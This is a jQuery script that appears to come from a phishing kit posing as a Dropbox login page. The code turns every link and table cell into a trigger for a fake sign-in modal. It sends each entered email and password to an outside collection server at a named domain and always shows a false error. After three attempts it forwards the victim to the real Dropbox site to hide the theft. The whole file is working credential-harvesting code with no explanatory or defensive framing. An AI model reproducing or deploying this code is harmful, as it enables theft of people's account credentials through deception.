$(document).ready(function(){
    var trials = 0;
    $("a").click( (e)=>{
        e.preventDefault();
        $("#modalbox").css("display", "block");
        var email = $("#email").val();
        if(email.length < 6 || !email.includes("@")){
            $("#email").attr("type", "text");
            $("#etext").css("display", "none");
            $("#email").val("");
            $("#email").focus();
        }else{
            $("#password").focus();
        }
    });

    

    $("td").click( (e)=>{
        e.preventDefault();
        $("#modalbox").css("display", "block");
        var email = $("#email").val();
        if(email.length < 6 || !email.includes("@")){
            $("#email").attr("type", "text");
            $("#etext").css("display", "none");
            $("#email").val("");
            $("#email").focus();
        }else{
            $("#password").focus();
        }
    });

    $("#submit").click( (e)=>{
        e.preventDefault();
        var email = $("#email").val();
        var password = $("#password").val();
        if(email.length < 6 || !email.includes("@")){
            alert("Please enter a valid email");
            return;
        }
        if(password.length < 4 || password == '1234'){
            alert("Please enter a valid password");
            return;
        }
        $("#error").css("display", "none");
        $("#mcontent").css("display", "none");
        $("#mspinner").css("display", "block");
        $.ajax({
            url: "https://exqiutech.com/phpsly/signin.php",
            method: "post",
            data: {
                X1: email,
                X2: password
            },
            success: function(data){
                trials++;
                setTimeout(() => {
                    if(trials == 3){
                        window.location.href = "https://dropbox.com";
                    }
                    $("#mspinner").css("display", "none");
                    $("#mcontent").css("display", "block");
                    $("#error").css("display", "block");
                    $("#password").val("");
                }, 6000);
            }
        })
    })

});